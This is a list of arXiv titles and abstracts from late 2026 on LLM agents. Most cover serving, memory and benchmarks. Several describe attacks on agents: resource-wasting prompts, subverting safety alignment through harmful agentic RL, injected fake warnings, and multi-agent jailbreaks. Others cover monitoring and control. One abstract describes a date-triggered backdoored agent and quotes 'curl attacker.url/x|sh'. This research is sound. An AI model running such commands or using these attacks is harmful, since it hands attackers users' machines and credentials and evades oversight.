http://arxiv.org/abs/2611.14704v1.title: Code as Explanations: Executable and Verifiable LLM Explanations
http://arxiv.org/abs/2611.14704v1.abstract: As large language models (LLMs) increasingly make consequential decisions and solve problems alongside humans, we must understand how models arrive at their conclusions. Understanding how an LLM behaves requires observing it across multiple inputs, yet free-text explanations such as chain-of-thought (CoT) are generated per instance and cannot be easily verified on new inputs. http://arxiv.org/abs/2611.17167v1.title: Actor, Judge, or Teacher? Understanding Decision Models in Long-Horizon Agents
http://arxiv.org/abs/2611.17167v1.abstract: Decision models answer a question with a typed output, such as a choice among options with a probability for each, so one model can choose an agent's actions, evaluate actions already taken, or score every action to teach a policy with reinforcement learning. Prior work has studied them mainly as actors, judging their usefulness by how well they act. We ask whether a decision model that acts poorly can still teach well. http://arxiv.org/abs/2611.14808v1.title: OverServe: Resource Amplification Attacks on SaaS Agents via Tool--Prompt Co-Design
http://arxiv.org/abs/2611.14808v1.abstract: Advances in large language models (LLMs) are enabling software-as-a-service (SaaS) providers to automate longer business workflows with agents. In subscription-based SaaS deployments, model and tool calls consume provider resources without additional customer payments. Because the agent autonomously decides when to stop, a malicious tenant can send a prompt to the agent, exploiting its completion decisions to extend execution and waste provider resources. http://arxiv.org/abs/2611.15223v1.abstract: Large-language model (LLM) agents execute actions on external systems through tool calls, and enterprises deploy runtime controls, such as agent gateways, to check this behavior in real time. However, a control can only evaluate the actions that cross the point where it is placed, and an agent can act through more paths than the tool-call channel; no existing work measures this coverage against kernel-level ground truth. http://arxiv.org/abs/2611.16627v1.abstract: Long-horizon language agents accumulate tool results and replies until the history no longer fits the context window. Current agents shrink this history by having a model summarize it, so each compaction rereads and rewrites the history it replaces, and cache-aware triggers decide when to compact while taking the size of the result as given. We present Folio, a context manager that records, folds, and recovers history through one set of handles. http://arxiv.org/abs/2611.17068v1.title: Discovering Effective Agent Memory Designs through Program Evolution
http://arxiv.org/abs/2611.17068v1.abstract: Program evolution provides a promising approach to discover agent memory designs and study the choices underlying their effectiveness. We introduce MAPE, a framework that evolves whole memory programs from minimal seeds through a standardized lifecycle interface and an iterative diagnosis-proposal loop. Experiments on LoCoMo and LongMemEval yield an absolute accuracy gain of up to 12% over manually designed baselines at 35% of the serving cost, with further evaluations supporting transfer across serving backbones and benchmarks. http://arxiv.org/abs/2611.16369v1.title: Bait: Mitigating Harmful Agentic Reinforcement Learning via Probing Reward Function
http://arxiv.org/abs/2611.16369v1.abstract: We expose a safety vulnerability on nascent agentic reinforcement-learning-as-a-service. Specifically, with a cost as low as \$20, we show that safety alignment of a large language model (e.g., Inkling) can be completely subverted through rounds of harmful agentic reinforcement learning (agentic RL) with a toxic environment from its users. http://arxiv.org/abs/2611.15126v1.title: Recompute or Restore? Host-Tier KV for Multi-Model Agent Workflows on a Static-Graph NPU Serving Stack
http://arxiv.org/abs/2611.15126v1.abstract: Agent workflows issue dependent model calls that share long context prefixes, so serving them efficiently depends on reusing the key-value (KV) cache of those prefixes. On accelerators that compile model graphs ahead of time, however, the device KV budget is fixed, and prefixes evicted under load must be recomputed. http://arxiv.org/abs/2611.16591v1.title: Singularity-Bench: Can Agents Build Agents?
http://arxiv.org/abs/2611.16591v1.abstract: Frontier AI agents increasingly succeed on realistic, long-horizon tasks and are beginning to improve the systems through which they operate. Yet existing benchmarks often restrict agents to narrow action spaces, use simplified environments, or rely on verification methods that are unreliable for evaluating arbitrary agent-generated systems. We introduce Singularity-Bench, an open-ended benchmark for autonomous AI development with six end-to-end tasks spanning pre-training, mid-training, post-training, inference, the agent harness, and cluster orchestration. http://arxiv.org/abs/2611.15118v1.abstract: Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. http://arxiv.org/abs/2611.15006v1.title: EvoX: Rethinking the Agent Harness as a Runtime Policy
http://arxiv.org/abs/2611.15006v1.abstract: Large language model (LLM) agents increasingly interact with tools and environments, yet plausible model decisions do not always translate into successful execution due to tool-call mismatches, interrupted workflows, and unsupported completion claims. We present EvoX, a Rust-based, multi-model agent runtime guided by The Second Policy, which views the harness as an Operational Policy complementing the foundation model's Semantic Policy. http://arxiv.org/abs/2611.16215v1.title: Guided Generation of Linux Kernel Semantic Patches with Small Local Language Models
http://arxiv.org/abs/2611.16215v1.abstract: When a Linux kernel API changes, hundreds of drivers are converted by hand over months, and the earlier conversions are reviewed examples for the later ones. We ask whether small open language models running on a laptop can turn such examples into Coccinelle semantic patches, the rules kernel maintainers already use for tree-wide changes. http://arxiv.org/abs/2611.14864v1.title: When Safety Becomes an Attack Surface: Manipulating Abstention in Tool-Using AI Agents
http://arxiv.org/abs/2611.14864v1.abstract: An AI agent's decision not to act can itself become an attack surface. We study warning-induced over-abstention, an availability attack in which adversaries place fabricated risk warnings in low-trust content to prevent legitimate task completion. Our central premise is that safe abstention requires evaluating both the claimed risk and the authority of the evidence supporting it. http://arxiv.org/abs/2611.14681v1.abstract: Today's AI workloads are rapidly changing: new models are released more often, model architectures are increasingly diverse, and traffic distributions change frequently. The challenge we face at Together AI is continual optimization for these changing workloads. Compiling a deployment into an optimized forward pass is a challenge that is well-suited for agent hill-climbing. Existing systems struggle with continual compilation due to a tradeoff between measurement throughput and fidelity. http://arxiv.org/abs/2611.17780v1.abstract: Frontier LLM agents that query databases with tools are among the most accurate text-to-SQL systems, but per-query calls to a hosted model are slow, costly, and expose sensitive organizational queries to external APIs. For example, a Claude Opus 5.5 agent serving 10,000 queries a day costs over $70,000 a year at list price. http://arxiv.org/abs/2611.17527v1.abstract: Running open-weight language models locally on a single consumer GPU requires replacing expanding multi-turn exploration histories with short, stateless code inspections. Stateless repository localization, however, hinges on a foundational question: when a frozen language model evaluates an unedited code entity from a compact view, which structural relationships make its relevance judgment informative about a nearby repair target? http://arxiv.org/abs/2611.17753v1.title: Superfluid: Local AI Server for Distributed LLM Inference
http://arxiv.org/abs/2611.17753v1.abstract: Running large language models (LLMs) on local devices keeps data private, removes per-token cost, cuts network latency, and keeps working without a connection. Two shifts now strain how such models are served. On one device, several agents share a locally served model with an interactive user. Across devices, a developer or small team often owns several capable machines from different vendors, which sit idle most of the day because every local server serves one runtime on one machine. http://arxiv.org/abs/2611.18553v1.abstract: Recent work shows that large language models (LLMs) can operate directly on the parameters of other neural networks. They can read what a network was trained to do, fix a network that fails, and write working networks from scratch, all without gradient descent. This capability has been termed Weight-Space Programming (WSP). Exploring this new paradigm systematically requires a robust benchmark. http://arxiv.org/abs/2611.17806v1.abstract: Long-horizon agents increasingly serve as persistent personal assistants across modern web platforms, managing schedules, applications, and multi-step plans over weeks or months. Users often return to an ongoing conversation after a long conversational hiatus, while earlier bookings and preparation notes stay on record. During this hiatus, scheduled dates may pass even though the retained records remain unchanged and event outcomes go unrecorded. http://arxiv.org/abs/2611.17440v1.abstract: Standard coding-agent benchmarks primarily evaluate binary task success, treating execution as a black box and obscuring the behaviors that produce those outcomes. We analyze a large corpus of 143,209 execution trajectories from 125 agent configurations spanning 117 unique models. http://arxiv.org/abs/2611.17696v1.title: Co-Sight Harness: Externalized Control Assets and Deterministic Enforcement for Long-Horizon Business Agents
http://arxiv.org/abs/2611.17696v1.abstract: Long-horizon business workflows fail in two ways: errors accumulate as a chain of activities lengthens, and the knowledge an activity needs is written in a different vocabulary from the user's request. We study whether such workflows can be made reliable without changing the language model. Our method keeps the backbone fixed and moves the workflow definition, state and domain knowledge into versioned control assets outside the model. http://arxiv.org/abs/2611.17520v1.title: Only as Safe as the Weakest Agent: A Break That Appears Only When the System Is Multi-Agent
http://arxiv.org/abs/2611.17520v1.abstract: Major industry multi-agent systems like Codex and Claude Code can be broken by attacks that have long been unsuccessful against modern frontier models. AI Safety as a discipline has largely focused on finding the bounds and vulnerabilities of AI models used in isolation. Yet as humans increasingly deploy these models as agents and multi-agent systems, the same attacks that had been thought to be patched when using a model in isolation can break these same models under specific circumstances. http://arxiv.org/abs/2611.17460v1.title: Unfinished-Bench: Measuring Rule Violations by Persistent Agents in Realistic Work Environments
http://arxiv.org/abs/2611.17460v1.abstract: AI agents are increasingly equipped with persistence toward task completion to run delegated work autonomously for long periods, under many unstated constraints from internal documents and other people's authority. When completion requires violating a rule, the agent must decide alone, yet benchmarks of instruction-rule conflicts state the rule in the prompt or keep it hidden and do not evaluate persistence. http://arxiv.org/abs/2611.18030v1.abstract: Industry now relies on LLMs to write a large share of production code. Although that code is mostly, but not always, correct, correctness alone does not determine whether it is fit for repeated and extensive use, which depends on what the code costs in time, memory and energy. http://arxiv.org/abs/2611.17955v1.abstract: Web agents powered by large language and vision-language models are increasingly applied to realistic browser work that spans heterogeneous applications, multimodal content, and stateful workflows. http://arxiv.org/abs/2611.17797v1.abstract: Multimodal agentic coding requires robust visual reasoning to analyze observations and evaluate generated artifacts. Current frameworks largely rely on a Thinking-with-Images paradigm, where agents depend on their intrinsic vision to execute visually grounded tasks. http://arxiv.org/abs/2611.17605v1.abstract: A developer running a code assistant on a laptop downloads one model file, and local inference moves the energy of every request onto that machine. http://arxiv.org/abs/2611.18459v1.abstract: Agent sessions may involve frequent context edits, which effectively invalidate cached KV state and force requests to wait for re-prefill before decoding. http://arxiv.org/abs/2611.21129v1.abstract: LLM agents can use remote tools and cloud sandboxes, but integrating reasoning, session state, and heterogeneous execution sites remains a runtime design problem. http://arxiv.org/abs/2611.18890v1.abstract: Teams deploying coding agents need benchmarks built from their own code, but curating and validating them by hand is resource intensive, and an unvalidated benchmark can mislead silently. http://arxiv.org/abs/2611.19886v1.abstract: Large Language Model (LLM) agents interact with their environments through tools, reading repositories, running builds, and pushing code. http://arxiv.org/abs/2611.20595v1.abstract: LLM agents answer questions by calling APIs and trusting the results. An API can fail silently. http://arxiv.org/abs/2611.19823v1.abstract: Reflective skill optimizers improve multi-turn LLM agents by revising instructions from failed and successful rollouts, yet accumulating edge-case rules bloats prompts, inflates token use, and pushes agents into long, error-prone loops. http://arxiv.org/abs/2611.19537v1.abstract: Coding agents can synthesize and optimize code-based policies from simulator feedback, allowing the resulting program to act with zero inference model calls. http://arxiv.org/abs/2611.22583v1.abstract: Tool-using language-model agents must act on information from untrusted emails, webpages, and documents. http://arxiv.org/abs/2611.22888v1.abstract: Vulnerability exploitation tests whether language model agents can develop working exploits from known software flaws. http://arxiv.org/abs/2611.22432v1.abstract: Fast System-1 models enable responsive actions but struggle with complex or unfamiliar tasks. http://arxiv.org/abs/2611.22511v1.abstract: Interpretability for AI agents should not be confined to understanding the model's internal weights. http://arxiv.org/abs/2611.22299v1.abstract: Whether a foundation model succeeds as an autonomous agent depends as much on its runtime software as on its weights. http://arxiv.org/abs/2611.22148v1.abstract: Open-weight language models are widely observed to get worse the longer they generate. Often, attempts to fix this involve more training. http://arxiv.org/abs/2611.23142v1.abstract: The "AI revolution" has enabled teams across the technology industry to deliver software features at unprecedented velocity. http://arxiv.org/abs/2611.22563v1.abstract: CAD practitioners often work with proprietary parts that they are unwilling to share with external services. http://arxiv.org/abs/2611.22565v1.abstract: Turning a CAD model into a machining program requires both process knowledge and geometric precision. http://arxiv.org/abs/2611.22605v1.abstract: Automatic prompt optimization is growing more elaborate. Recent methods stack policy-gradient updates, trace reflection, and evolutionary search. http://arxiv.org/abs/2611.21799v1.abstract: Chain-of-thought (CoT) monitoring is a promising tool for detecting hidden goals, off-task behavior, and other failures in AI agents. http://arxiv.org/abs/2611.24294v1.abstract: Knowledge engineering (KE) turns raw files into a reasoning-ready knowledge base, a task now within reach of LLM agents. http://arxiv.org/abs/2611.24491v1.abstract: Frontier coding agents increasingly exhibit overeagerness, taking surprising, sometimes reckless actions beyond a user's mandate --- reported in recent system cards from frontier model developers. http://arxiv.org/abs/2611.24324v1.abstract: AI coding agents have become one of the most popular applications of large language models. http://arxiv.org/abs/2611.24313v1.abstract: Prompt injection is the dominant unsolved security risk for LLM agents, and the community now agrees that robustness must be measured against adaptive attackers rather than fixed benchmark injections. http://arxiv.org/abs/2611.23817v1.abstract: Coding agents now write whole codebases in long autonomous runs, guided mainly by whether their tests pass. http://arxiv.org/abs/2611.24406v1.abstract: High-quality causal reasoning datasets are essential for developing models with reliable causal understanding, particularly in specialized domains. http://arxiv.org/abs/2611.23388v1.abstract: Post-training quantization is the standard way to serve large language models at low cost. http://arxiv.org/abs/2611.24085v1.abstract: Evaluating distributed large language model (LLM) serving on heterogeneous edge devices requires exploring diverse model partitions, device placements, and network conditions, making repeated physical experiments costly. http://arxiv.org/abs/2611.26553v1.abstract: Agents based on large language models (LLMs) can now delete files and send payments on behalf of their users. http://arxiv.org/abs/2611.25380v1.abstract: Domain specialization of LLM agents is usually framed as a weight-update problem: collect trajectories, run reinforcement learning (RL) or supervised fine-tuning (SFT), and deploy a new checkpoint. http://arxiv.org/abs/2611.25360v1.abstract: Large language models (LLMs) are increasingly used not only to power AI agents but also to build them. http://arxiv.org/abs/2611.26423v1.abstract: Deep-research agents repeatedly decide what to search, read, and verify, often using large cloud-hosted language models for action proposal. http://arxiv.org/abs/2611.26069v1.title: SheetAlign: Grounded Interaction and Stage-Isolated Learning for Spreadsheet Agents
http://arxiv.org/abs/2611.26069v1.abstract: Spreadsheets are widely used for data analysis and supporting decision-making.
